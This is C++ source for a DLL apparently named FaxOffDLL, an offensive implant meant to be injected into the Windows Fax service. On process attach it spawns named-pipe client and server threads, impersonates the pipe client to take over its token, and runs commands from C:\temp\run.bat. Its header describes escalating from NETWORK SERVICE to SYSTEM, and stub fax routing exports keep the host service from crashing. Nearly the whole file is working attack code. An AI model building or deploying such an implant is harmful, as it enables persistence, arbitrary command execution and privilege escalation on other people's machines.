/* 
 * FaxOffDLL
 * =========
 * A FAX extension DLL that can safely be injected into the FXSSVC to execute commands.
 * The DLL could use a namedpipe token inheretince exploit to elevate from "NETWORK SERVICE"
 * to "SYSTEM". It will currently execute any command from c:\temp\run.bat.
 * 
 * e.g
 * C:\Windows\system32>whoami
 * nt authority\network service
 * 
 * C:\Windows\system32>whoami /priv
 * 
 * PRIVILEGES INFORMATION
 * ----------------------
 * 
 * Privilege Name                Description                               State
 * ============================= ========================================= ========
 * SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
 * SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
 * SeAuditPrivilege              Generate security audits                  Enabled
 * SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
 * SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 * SeCreateGlobalPrivilege       Create global objects                     Enabled
 * 
 */
#include <sddl.h>
#include "pch.h"
#ifdef _M_X64
#define WIN32 0
#else
#endif
#include <WinFax.h>
#include <FaxComEx.h>
#include <sddl.h>
#pragma comment (lib, "Secur32.lib")
#pragma comment (lib, "advapi32.lib")
#pragma comment (lib, "user32.lib") 
#pragma comment (lib, "ntdll.lib") 
#pragma comment(lib,"winfax.lib")

HINSTANCE g_hMainDll = NULL;

// used to generate a random string for the named pipe.
void GenRandomString(wchar_t* s, const int len)
{
	static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	for (int i = 0; i < len; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}
	s[len] = 0;
}

DWORD WINAPI ServerThread(LPVOID lpParameter) // create the server named pipe
{
	HANDLE  hPipe;
	BOOL    isConnected;
	SECURITY_ATTRIBUTES     sa;
	WCHAR   server[512];
	char buffer[256];
	DWORD dwRead = 0;
	LPWSTR PipeName = (LPWSTR)lpParameter;
	wsprintf(server, L"\\\\.\\pipe\\%s", PipeName);
	if (!InitializeSecurityDescriptor(&sa, SECURITY_DESCRIPTOR_REVISION))
	{
		return 0;
	}
	/*if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
	{
		return 0;
	}*/
	hPipe = CreateNamedPipe(server,PIPE_ACCESS_DUPLEX,PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, sizeof(DWORD), 0, NMPWAIT_USE_DEFAULT_WAIT, &sa);
	if (hPipe == INVALID_HANDLE_VALUE) {
		return 0;
	}
	isConnected = ConnectNamedPipe(hPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
	if (isConnected)
	{
		ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL);
		if (!ImpersonateNamedPipeClient(hPipe)) {
			return 0;
		}
		// TODO: execute with primary token here
		WinExec("C:\\temp\\run.bat", SW_SHOW);
	}
	else
		CloseHandle(hPipe);
	return 1;
}

DWORD WINAPI ClientThread(LPVOID lpParameter) // loop connections to the named pipe
{
	LPWSTR PipeName = (LPWSTR)lpParameter;
	DWORD cbWritten = 0;
	wchar_t server[512];
	HANDLE hPipe;
	wsprintf(server, L"\\\\127.0.0.1\\pipe\\%s", PipeName);
	while (1)
	{
		hPipe = CreateFile(server, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hPipe != NULL)
			break;
		Sleep(100);
	}
	WriteFile(hPipe, L"A", 1, &cbWritten,NULL);
	CloseHandle(hPipe);
	return 1;
}

BOOL WINAPI DllMain(IN PVOID hInstanceDll, IN ULONG dwReason, IN PVOID lpReserved)
{
	g_hMainDll = (HINSTANCE)hInstanceDll;
	HANDLE clientThreadHandle = NULL;
	HANDLE serverThreadHandle = NULL;
	DWORD dwThreadId0 = 0;
	DWORD dwThreadId1 = 0;
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		/* thread spawning during DLL loadimage() */
		wchar_t pipename[12];
		memset(pipename, 0, sizeof(pipename));
		GenRandomString(pipename, 11);
		/* This here runs as NT AUTHORITY\Network Service. */
		clientThreadHandle = CreateThread(NULL, 0, ClientThread, pipename, 0, &dwThreadId0); // Create the Client.
		// now do the server to steal the tokens.
		serverThreadHandle = CreateThread(NULL, 0, ServerThread, pipename, 0, &dwThreadId1); // Create the Server.
		// execute commands inside server
		if (clientThreadHandle != NULL) {
			CloseHandle(clientThreadHandle);
		}
		if (serverThreadHandle != NULL) {
			CloseHandle(serverThreadHandle);
		}
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
	default:
		break;
	}
	return TRUE;
}

extern "C" __declspec(dllexport) BOOL FaxRouteInitialize(HANDLE HeapHandle, void* FaxRouteCallbackRoutines) {
    // This function is explicitly called first within the DLL.
	return true;
}

// These functions need to be exported to prevent the FAX service from crashing.
extern "C" __declspec(dllexport) BOOL FaxRouteMethod(PVOID * unnamedParam1, PVOID * unnamedParam2, LPDWORD unnamedParam3) {
    return true;
}

extern "C" __declspec(dllexport) BOOL FaxRouteDeviceChangeNotification(DWORD DeviceId, BOOL  NewDevice) {
	return true;
}

extern "C" __declspec(dllexport) BOOL FaxRouteDeviceEnable(LPCWSTR RoutingGuid, DWORD DeviceId, LONG Enabled) {
	return true;
}

extern "C" __declspec(dllexport) BOOL FaxRouteGetRoutingInfo(LPCWSTR RoutingGuid, DWORD DeviceId, LPBYTE  RoutingInfo, LPDWORD RoutingInfoSize) {
	return true;
}

extern "C" __declspec(dllexport) BOOL FaxRouteSetRoutingInfo(LPCWSTR RoutingGuid, DWORD DeviceId, const BYTE * RoutingInfo, DWORD RoutingInfoSize) {
	return true;
}
